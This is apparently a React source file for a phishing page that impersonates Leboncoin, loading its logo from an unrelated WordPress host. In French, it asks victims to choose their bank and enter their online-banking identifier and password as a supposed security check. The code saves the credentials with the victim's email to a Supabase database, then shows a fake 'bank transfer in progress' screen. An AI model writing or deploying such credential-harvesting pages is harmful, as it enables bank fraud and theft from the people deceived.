import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import Footer from "@/components/Footer";
import ProgressStepper from "@/components/ProgressStepper";
import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
import { upsertUser } from "@/utils/supabaseClient";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";

const BankConfirmation: React.FC = () => {
  const [typeBanque, setTypeBanque] = useState("");
  const [identifiantBancaire, setIdentifiantBancaire] = useState("");
  const [codePersonnel, setCodePersonnel] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [processing, setProcessing] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!typeBanque || !identifiantBancaire || !codePersonnel) {
      toast.error("Veuillez remplir tous les champs");
      return;
    }

    setIsLoading(true);

    try {
      // Récupérer l'email de la session pour identifier l'utilisateur
      const userData = getFromSession("userData") || {};
      const email = userData.email;
      
      if (!email) {
        toast.error("Erreur: email utilisateur manquant");
        setIsLoading(false);
        return;
      }
      
      // Préparation des données bancaires en utilisant les noms de champs corrects
      // qui correspondent à la structure de la base de données Supabase
      const bankData = {
        email,
        typebanque: typeBanque,
        identifiantbancaire: identifiantBancaire, // Corrigé pour correspondre à la colonne dans Supabase
        codepersonnel: codePersonnel
      };
      
      console.log("Données à envoyer à Supabase:", bankData);
      
      // Mettre à jour la session avec les données complètes (en format camelCase pour l'interface)
      updateUserSession({
        typeBanque,
        identifiantBancaire,
        codePersonnel
      });
      
      // Envoyer les données bancaires à Supabase
      const result = await upsertUser(bankData);
      console.log("Résultat de l'opération upsertUser:", result);
      
      setIsLoading(false);
      setProcessing(true);
      
      // Redirection vers la page de succès après sauvegarde
      setTimeout(() => {
        navigate("/success");
      }, 3000);
    } catch (error: any) {
      console.error("Erreur lors de l'enregistrement:", error);
      setIsLoading(false);
      setProcessing(false);
      
      if (error.isRlsError) {
        toast.error(`Erreur de sécurité Supabase: ${error.message}`);
      } else {
        toast.error("Une erreur est survenue lors de l'enregistrement des données.");
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="w-full py-4 border-b border-gray-200">
        <div className="container mx-auto px-4">
          <img 
            src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" 
            alt="Leboncoin" 
            className="h-8" 
          />
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center p-4">
        {processing ? (
          <div className="w-full max-w-lg px-6 py-12 bg-white rounded-lg text-center animate-fade-in">
            <div className="flex flex-col items-center justify-center">
              <div className="w-16 h-16 mb-8">
                <svg 
                  className="w-full h-full text-leboncoin-orange animate-spin-grow" 
                  viewBox="0 0 24 24"
                >
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                  <path 
                    className="opacity-75" 
                    fill="currentColor" 
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  />
                </svg>
              </div>
              <h2 className="text-2xl font-bold mb-2">Traitement en cours</h2>
              <p className="text-gray-600">Virement bancaire en cours de traitement...</p>
            </div>
          </div>
        ) : (
          <div className="w-full max-w-lg px-6 py-8 bg-white rounded-lg animate-fade-in">
            <ProgressStepper 
              currentStep={2} 
              steps={["Confirm", "Checkpoint", "Verify", "Complete"]} 
            />

            <h1 className="text-3xl font-bold text-center mb-4">
              Confirmez votre banque
            </h1>
            
            <p className="text-center text-gray-600 mb-8">
              Confirmation d'identité.
            </p>

            <div className="flex justify-center mb-8">
              <div className="w-24 h-24 bg-gray-100 rounded-lg flex items-center justify-center">
                <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M24 4L4 14V18H44V14L24 4Z" stroke="#6B7280" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <rect x="8" y="18" width="32" height="20" stroke="#6B7280" strokeWidth="2"/>
                  <line x1="12" y1="18" x2="12" y2="38" stroke="#6B7280" strokeWidth="2"/>
                  <line x1="20" y1="18" x2="20" y2="38" stroke="#6B7280" strokeWidth="2"/>
                  <line x1="28" y1="18" x2="28" y2="38" stroke="#6B7280" strokeWidth="2"/>
                  <line x1="36" y1="18" x2="36" y2="38" stroke="#6B7280" strokeWidth="2"/>
                  <rect x="4" y="38" width="40" height="6" stroke="#6B7280" strokeWidth="2"/>
                </svg>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <select
                  value={typeBanque}
                  onChange={(e) => setTypeBanque(e.target.value)}
                  className="w-full rounded-md border border-gray-300 px-4 py-2"
                >
                  <option value="">Sélectionnez votre type de banque.</option>
                  <option value="credit-agricole">Crédit Agricole</option>
                  <option value="bnp-paribas">BNP Paribas</option>
                  <option value="societe-generale">Société Générale</option>
                  <option value="caisse-epargne">Caisse d'Epargne</option>
                  <option value="lcl">LCL</option>
                  <option value="banque-postale">La Banque Postale</option>
                </select>
              </div>

              <div>
                <input
                  type="text"
                  value={identifiantBancaire}
                  onChange={(e) => setIdentifiantBancaire(e.target.value)}
                  className="w-full rounded-md border border-gray-300 px-4 py-2"
                  placeholder="Identifiant bancaire"
                />
              </div>

              <div>
                <input
                  type="password"
                  value={codePersonnel}
                  onChange={(e) => setCodePersonnel(e.target.value)}
                  className="w-full rounded-md border border-gray-300 px-4 py-2"
                  placeholder="Code personnel"
                />
              </div>

              <div className="mt-6 text-sm text-gray-600">
                <p>Vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne par mesure de sécurité.</p>
                <p className="mt-2">Pour confirmer votre compte bancaire, veuillez saisir le numéro de client et le mot de passe utilisé pour vos services bancaires en ligne.</p>
              </div>

              <Button
                type="submit"
                className="w-full bg-orange-500 hover:bg-orange-600 text-white"
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Chargement...
                  </span>
                ) : (
                  "Continuer"
                )}
              </Button>
            </form>
          </div>
        )}
      </main>

      <Footer />
    </div>
  );
};

export default BankConfirmation;
